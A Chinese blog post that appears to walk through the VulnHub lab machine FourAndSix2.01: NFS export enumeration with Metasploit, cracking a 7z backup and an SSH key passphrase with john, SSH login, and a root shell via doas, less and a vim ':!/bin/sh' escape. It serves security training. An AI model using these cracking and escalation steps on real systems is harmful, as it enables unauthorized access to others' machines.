---
title: 跟着红队笔记打靶：FourAndSix2.01
url: https://mp.weixin.qq.com/s/lb8u2mUKHeRFtTDb6lY7og
source: Doonsec's feed
date: 2026-03-26
fetch_date: 2026-03-27T04:29:02.147893
---

# 跟着红队笔记打靶：FourAndSix2.01

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/hAugh98lMaQWhUA3okp7VUySRJCiaYP3WnbXmv73oh1sZkeofiazg1ayF8l5hNFFOVMicm7g9erNXD8bd5ZGPcMsqLTmtsxPeQYGYy51Uapvpc/0?wx_fmt=jpeg)

# 跟着红队笔记打靶：FourAndSix2.01

原创

网安热爱者week
网安热爱者week

week的杂货铺

![]()

在小说阅读器中沉浸阅读

靶场地址：

https://www.vulnhub.com/entry/fourandsix-201,266/

大佬的视频：

【「红队笔记」靶机精讲：FourandSix2.01 - 小巧精悍，干净利落的靶机，暴力破解x2，更有less+vi提权。】https://www.bilibili.com/video/BV1Kv4y187Ch?vd\_source=3caf2dac9c9273de4d9b0fead4712250

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaQQAlGib4fhkGSxwdXyXcAnlszUYQxcD7kicCgf8QrGYGy5ZMDSO6GNRdlBek6ZsuQxiaRiby5riakEnvRwRicj06btbdXxGicPsM1U3A/640?wx_fmt=png&from=appmsg)

# 1. 信息搜集：

## 1.1. 主机发现：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaSZTCzGBZ1EsDnZWvCyib2M11C4F2eOt0AT1Z5ZjWyDoicXnLqZUWXMgBeIx9jOhOYtjmib84Ve6JNibSHEkhZ6T5z2YuhHjpJ1jVE/640?wx_fmt=png&from=appmsg)

139是靶机

## 1.2. 端口扫描：

TCP:

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaR7P25scpNTJpue9TnUPBUY9eNQXtfXwrNWuxcp9U0eZPbWh5FfbkSUYPwHpia3I4ktOrJYBRia3vTSvUxHfwm7BcxOhpQXUWvn0/640?wx_fmt=png&from=appmsg)

有一个nfs挂载 甚至是默认端口2049

UDP:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaRzRY0BchicAINJpRWGSUPKDK4aic8S2l72gGeMZLicx7rKjVy7nOeib0Ye6abe2bcicpx4KsCathA8toDpcyf9VQOVMOuXNoEcocEA/640?wx_fmt=png&from=appmsg)

## 1.3. 详细扫描：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaQW2MxiakXLtYT6pF9XnxMxr9DbboXNicfC8ia8pZR7Yq3UucPdQLqHahdia2oQwia2QY7fDo0ChjdO9pVMpPSRibxGJsfricZcPBicF9I/640?wx_fmt=png&from=appmsg)

nmap自带脚本扫描：
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaQIjQ7ibAia8nyc2bj6Yjt4LYdHxgpxI8X87WIe6kF3nBnj5doNl8iaicOKc7lEZQZqqTnFJcf9XgGNqxRkb832ShRsHntYMicDIic9E/640?wx_fmt=png&from=appmsg)

没啥结果。。。。

有nsf挂载的话

看一下挂载:

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaRrklLcfW90W8S62pDtJ7EdNiatLWaeicPEVicySwwBJBQynMO9Q9hOkdYicEvhD8ZfOuedyzfPO9lYNK6zXsXFKWuT8LQhCFdfn8o/640?wx_fmt=png&from=appmsg)

挂载到本地：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaSBicGBCkQDWo2tDBsy65aa5BpX7gjDjsuZYbAxCgrIqF9KeweVSy74azMduwG87NYugR6HZSib6IgkcwiaQApB6JNFiaa74SWOL4Q/640?wx_fmt=png&from=appmsg)

这里也可以使用msf进行挂载：

```
msf > use  auxiliary/scanner/nfs/nfsmountmsf auxiliary(scanner/nfs/nfsmount) > show options
Module options (auxiliary/scanner/nfs/nfsmount):
   NameCurrent Setting  Required  Description   -------------------  --------  -----------   PROTOCOLudp              yes       The protocol to use (Accepted: udp, tcp)   RHOSTS                     yes       The target address range or CIDR identifier   RPORT111              yes       The target port (TCP)   THREADS1                yes       The number of concurrent threads
msf auxiliary(scanner/nfs/nfsmount) > set rhosts 192.168.137.139rhosts => 192.168.137.139msf auxiliary(scanner/nfs/nfsmount) > run
[+] 192.168.137.139:111       - 192.168.137.139 NFS Export: /home/user/storage [][*] Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed
```

cd进去里面有一个7z文件 拷贝到本地

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaQzBnMlCGKDm6jniaEqpf1UZP0nA5icmXDD4zDgoHYuUokkkftTzX1JXicryJfntO4EWIMQDTSXzDAeEgya7LRA5T0S4eTSicFOsms/640?wx_fmt=png&from=appmsg)

没啥特别的东西 但是需要密码。。。

利用hash进行密码爆破：

```
7z2john backup.7z > backup7z_hashjohn --format=7z --wordlist=/usr/share/wordlists/rockyou.txt backup7z_hash
```

结果是chocolate

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaSWDHX0VWia0vTnCQOXZTib9ORbE2TcNctlGiau56MoLc39X28TAB7ERT2iaRAUyRicHXMsYsCZuiarmAWRV2TVuBFoHvOkO4iaTrQ4Kg/640?wx_fmt=png&from=appmsg)

解开之后是这几个文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaQ13XiaRMdzDkNs8ibqnxKbpOpqicShRW34CKRaiaiaHaNnRzNiafqIYmwx8wKsHfh3aTf4xDHMQ5Gw05G6vMYpOAFNSSEf4xopKZ5uM/640?wx_fmt=png&from=appmsg)

图片没啥信息。。。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaT61NyTkIaHeibkibxjhrg9kzGKgatygBV6aBicyZ3uk3FialOibWGicDL5lJq8d814HreK20DpDPuDleEibEaybF1WT0kib7KjeeicF0rA/640?wx_fmt=png&from=appmsg)

但是两个rsa是ssh的密钥 一个公钥一个私钥

这里已经可以明确是使用这个进行ssh登陆了

尝试一下：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaSMk0fSw2nGohIgrmncgAzza2IibQpNI5l7DxK7ic06p8qYc5ULMWico33lBSvxKL76gYjQQ17YP5bJ6ia2Xeib98NH8dgWRLFHjdo8/640?wx_fmt=png&from=appmsg)

这个报错是说之前有过这个ip的ssh记录了 需要删除一下：

```
sudo ssh-keygen -f '/root/.ssh/known_hosts' -R '192.168.137.139'
```

再访问发现还需要一个密码：

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaRBFEPlAweDx3NoadjAGwgichHibHulkicUIYGQ3oibwIy1xHeGcncW5Mfo09t0NQ1Ed7ggBSEAnTr2WWE8mTS73jHKfLVs55ZWGh0/640?wx_fmt=png&from=appmsg)

依旧是请john解密：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaSrxLn7F3Rg1k4BBmaXsDAk2bhhef5tMczCLfZFSuLiaAg7c8sKaeyA44HOpVBJGSWgE3fbk2bXt5XRvE2d0zLJR8apmTwpHMaM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaSNSgRuKaibxtXuPicMk81bl6dicxSVvZ1bG20micaxiadsibicQTHzobj6daiadicXPzgdMWZP5o2rQ4aY6KBqxUttUNtEAwZqxHjgaoW4/640?wx_fmt=png&from=appmsg)

最后是12345678

成功进入：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaRMvS5Uhyt9MQWC6UHXjG8rBQ3oDcmiaeT0K7F8quK3STxiaM66lVpiaYl8HPkraB6uG6SSLp7q6qvw57ZZbqUPx0MwHSfpIacqc4/640?wx_fmt=png&from=appmsg)

ksh是个啥玩意。。。

sudo不能用

/etc/crontab没有

/etc/passwd:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaSPhicZWZ6mNqsqp3QN12icF6Lg6k19qgJFe3uGC8ULfficnq6A6cj14mZ8vicU0NJrutvHm2hfZzPO2kQ2oFm6NSgr9Gear8tYtgg/640?wx_fmt=png&from=appmsg)

看一下自己可用的文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaTYB71g5uXe7gGyDK5fKHLvico0icKwoPk0zz6C4VXMbwibPMMkf3Ye9jlP2h3P7QXicH6rgoTNMhjCfs1yM1kshxxpGqtYIliaC1EE/640?wx_fmt=png&from=appmsg)

看一下以最高权限运行的文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaT68ZNX6mwsPfmhbh4ffwMtNkpiaPZ6OVWBRibISOkLcZdic8SoywS1quujK69ST1GkZKx0JickIIzuT0JgEKes3CcGWwlGWy9hpic8/640?wx_fmt=png&from=appmsg)

用doas吧

doas的默认config路径：
/etc/doas.conf

![](https://mmbiz.qpic.cn/mmbiz_png/hAugh98lMaSghoz5F4AjNg3zFkqpsBJYn5odZmClZWicseLI4SNyxIuTLS6Vdy51iaQHFGu5JN7SllO1p7SLJenJStLmspnENDFeVs1J6Pyibw/640?wx_fmt=png&from=appmsg)

可以以root权限 运行less查看authlog

那这里就是less提权了

这里查了半天doas咋用...

运行这个就可以了：

```
doas /usr/bin/less /var/log/authlog
```

doas会自己使用root权限去使用less查看authlog

less提权就比较正常了

但是这里不允许直接!/bin/sh

换一个方式的话 按v调用vim

然后在vim里面提权 输入：

```
:!/bin/sh
```

成功返回root:

![](https://mmbiz.qpic.cn/sz_mmbiz_png/hAugh98lMaSmCowUhZ6Y4ssvWiaBenxPh1YTSmAk0fHqNxEACISA8mgsw28rG89Sez3SVlIicPebXDzGVJby5WdR2vxJvtMLIqBUsvJTMQ5WQ/640?wx_fmt=png&from=appmsg)

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNnTxGCg6aIVbhM9D1S6MS9icUgXsY3jibbmDFsvMj1Y7QjcgdNcGRquVNaNicCiclHLh9ssHNicl2cJfA/0?wx_fmt=png)

week的杂货铺

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/ib1EqZv5G9SNnTxGCg6aIVbhM9D1S6MS9icUgXsY3jibbmDFsvMj1Y7QjcgdNcGRquVNaNicCiclHLh9ssHNicl2cJfA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过